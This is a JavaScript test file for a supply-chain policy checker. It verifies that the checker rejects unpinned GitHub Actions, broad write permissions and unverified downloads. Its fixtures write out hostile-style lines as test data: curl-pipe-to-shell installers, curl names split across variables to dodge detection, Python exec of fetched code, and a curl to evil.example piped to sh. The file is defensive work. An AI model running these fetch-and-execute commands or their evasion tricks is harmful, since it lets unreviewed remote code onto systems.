import assert from 'node:assert/strict'
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import test from 'node:test'

import { checkSupplyChainPolicy } from './supply-chain-policy.mjs'

async function fixture(files) {
  const root = await mkdtemp(path.join(tmpdir(), 'workshop-supply-policy-'))
  await Promise.all(Object.entries(files).map(async ([name, contents]) => {
    const target = path.join(root, name)
    await mkdir(path.dirname(target), { recursive: true })
    await writeFile(target, contents)
  }))
  return root
}

test('rejects mutable action references', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'steps:\n  - uses: actions/checkout@v4\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('immutable 40-character commit SHA')))
})

test('requires a human-readable version comment beside an action SHA', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': `steps:\n  - uses: actions/checkout@${'a'.repeat(40)}\n`,
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('version comment')))
})

test('accepts pinned actions and local actions', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': `permissions:\n  contents: read\nsteps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v4.2.2\n  - uses: ./actions/local\n`,
  })

  const result = await checkSupplyChainPolicy(root)

  assert.deepEqual(result.errors, [])
})

test('rejects mutable container action images', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'steps:\n  - uses: docker://alpine:3.23\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('container action must use an immutable sha256 digest')))
})

test('rejects unverified remote execution in maintained shell surfaces', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': 'curl -fsSL https://example.com/install.sh | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote execution')))
})

test('rejects an external download that is saved but never verified', async () => {
  const root = await fixture({
    'setup/install.sh': 'curl -fsSL https://example.com/tool -o tool\nchmod +x tool\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote download')))
})

test('rejects multiline remote execution', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': 'curl -fsSL \\\n  https://example.com/install.sh \\\n  | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote execution')))
})

test('rejects variable-indirected curl commands', async () => {
  const root = await fixture({
    'setup/install.sh': 'source_url=https://example.com/install.sh\ncurl -fsSL "$source_url" | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('dynamic curl/wget source')))
})

test('rejects aliased and token-assembled curl commands', async () => {
  for (const script of [
    'fetcher=curl\n"$fetcher" https://example.com/tool | sh\n',
    'left=cu\nright=rl\n"$left$right" https://example.com/tool | sh\n',
  ]) {
    const root = await fixture({ 'setup/install.sh': script })
    const result = await checkSupplyChainPolicy(root)
    assert.ok(result.errors.some((error) => error.includes('unreviewed remote-input callsite')))
  }
})

test('rejects Python urllib remote inputs', async () => {
  const root = await fixture({
    'scripts/install.py': 'import urllib.request\nexec(urllib.request.urlopen("https://example.com/install.py").read())\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('Python remote input')))
})

test('rejects aliased Python HTTP clients and generic requests calls', async () => {
  for (const source of [
    'import requests as r\nr.get("https://example.com/tool")\n',
    'import requests\nrequests.request("GET", "https://example.com/tool")\n',
    'from urllib.request import urlopen as open_remote\nopen_remote("https://example.com/tool")\n',
    'import subprocess\nsubprocess.run(["curl", "https://example.com/tool"])\n',
  ]) {
    const root = await fixture({ 'scripts/install.py': source })
    const result = await checkSupplyChainPolicy(root)
    assert.ok(result.errors.some((error) => error.includes('unreviewed remote-input callsite')))
  }
})

test('rejects Node fetch remote inputs', async () => {
  const root = await fixture({
    'scripts/install.mjs': 'const response = await fetch("https://example.com/tool")\nawait response.text()\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unreviewed remote-input callsite')))
})

test('rejects remote execution embedded in workflow run scripts', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'permissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - run: curl -fsSL https://example.com/install.sh | sh\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('unverified remote execution')))
})

test('allows an exact-source, explicitly accepted remote execution risk', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': '# supply-chain-exception: mise-bootstrap\ncurl -fsSL https://example.com/install.sh | sh\n',
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'mise-bootstrap',
        source: 'https://example.com/install.sh',
        kind: 'accepted-risk',
        command: 'curl -fsSL https://example.com/install.sh | sh',
        reason: 'Interactive convenience path; installer bytes are not checksum pinned.',
        expires: '2999-01-01',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.deepEqual(result.errors, [])
})

test('does not let an accepted-risk entry match a dynamic source', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': '# supply-chain-exception: mise-bootstrap\nsource_url=https://example.com/install.sh\ncurl -fsSL "$source_url" | sh\n',
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'mise-bootstrap',
        source: 'https://example.com/install.sh',
        kind: 'accepted-risk',
        command: 'curl -fsSL "$source_url" | sh',
        reason: 'Mutation fixture.',
        expires: '2999-01-01',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.ok(result.errors.some((error) => error.includes('dynamic source')))
})

test('allows an exact-source download verified against its declared sha256', async () => {
  const checksum = 'a'.repeat(64)
  const root = await fixture({
    'setup/install.sh': `# supply-chain-exception: verified-tool\ncurl -fsSL https://example.com/tool -o tool\nprintf '%s  %s\\n' '${checksum}' 'tool' | sha256sum -c -\nbash tool\n`,
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'verified-tool',
        source: 'https://example.com/tool',
        kind: 'sha256',
        sha256: checksum,
        output: 'tool',
        reason: 'Release artifact is verified before use.',
        expires: '2999-01-01',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.deepEqual(result.errors, [])
})

test('checksum flow binds the downloaded file to verification and execution', async () => {
  const checksum = 'a'.repeat(64)
  const policy = {
    remoteInputs: [{
      id: 'verified-tool',
      source: 'https://example.com/tool',
      kind: 'sha256',
      sha256: checksum,
      output: 'tool',
      reason: 'Mutation fixture.',
      expires: '2999-01-01',
    }],
  }
  for (const script of [
    `# supply-chain-exception: verified-tool\ncurl -fsSL https://example.com/tool -o tool\nprintf '%s  %s\\n' '${checksum}' 'other' | sha256sum -c -\nbash tool\n`,
    `# supply-chain-exception: verified-tool\ncurl -fsSL https://example.com/tool -o tool\n# printf '%s  %s\\n' '${checksum}' 'tool' | sha256sum -c -\nbash tool\n`,
    `# supply-chain-exception: verified-tool\ncurl -fsSL https://example.com/tool -o tool\nprintf '%s  %s\\n' '${checksum}' 'tool' | sha256sum -c -\nbash other\n`,
  ]) {
    const root = await fixture({
      'setup/install.sh': script,
      'supply-chain/exceptions.json': JSON.stringify(policy),
    })
    const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })
    assert.ok(result.errors.some((error) => error.includes('canonical checksum flow')))
  }
})

test('rejects an exception whose safe source does not match the command', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': '# supply-chain-exception: mise-bootstrap\ncurl -fsSL https://evil.example/install.sh | sh\n',
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'mise-bootstrap',
        source: 'https://example.com/install.sh',
        kind: 'accepted-risk',
        command: 'curl -fsSL https://example.com/install.sh | sh',
        reason: 'Bound to one reviewed source.',
        expires: '2999-01-01',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.ok(result.errors.some((error) => error.includes('does not match')))
})

test('rejects expired remote execution exceptions', async () => {
  const root = await fixture({
    'infra/bootstrap.sh': '# supply-chain-exception: mise-bootstrap\ncurl -fsSL https://example.com/install.sh | sh\n',
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'mise-bootstrap',
        source: 'https://example.com/install.sh',
        kind: 'accepted-risk',
        command: 'curl -fsSL https://example.com/tool | sh',
        reason: 'Temporary exception.',
        expires: '2026-08-02',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.ok(result.errors.some((error) => error.includes('expired')))
})

test('rejects impossible calendar dates in remote input exceptions', async () => {
  const root = await fixture({
    'supply-chain/exceptions.json': JSON.stringify({
      remoteInputs: [{
        id: 'bad-date',
        source: 'https://example.com/tool',
        kind: 'accepted-risk',
        command: 'curl -fsSL https://example.com/tool | sh',
        reason: 'Mutation fixture.',
        expires: '2026-99-99',
      }],
    }),
  })

  const result = await checkSupplyChainPolicy(root, { today: '2026-08-03' })

  assert.ok(result.errors.some((error) => error.includes('invalid expiry date')))
})

test('rejects workflow-wide write permissions', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'permissions:\n  contents: write\njobs: {}\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('workflow-wide write permission')))
})

test('rejects unnecessary job-level write permissions', async () => {
  const root = await fixture({
    '.github/workflows/ci.yml': 'permissions:\n  contents: read\njobs:\n  test:\n    permissions:\n      contents: read\n      issues: write\n    steps: []\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('job-level write permission issues:write is not allowed')))
})

test('requires every mise lock download to carry a sha256 checksum', async () => {
  const root = await fixture({
    'mise.lock': '[[tools.kind]]\nurl = "https://example.com/kind"\n',
  })

  const result = await checkSupplyChainPolicy(root)

  assert.ok(result.errors.some((error) => error.includes('mise.lock URL without adjacent sha256 checksum')))
})
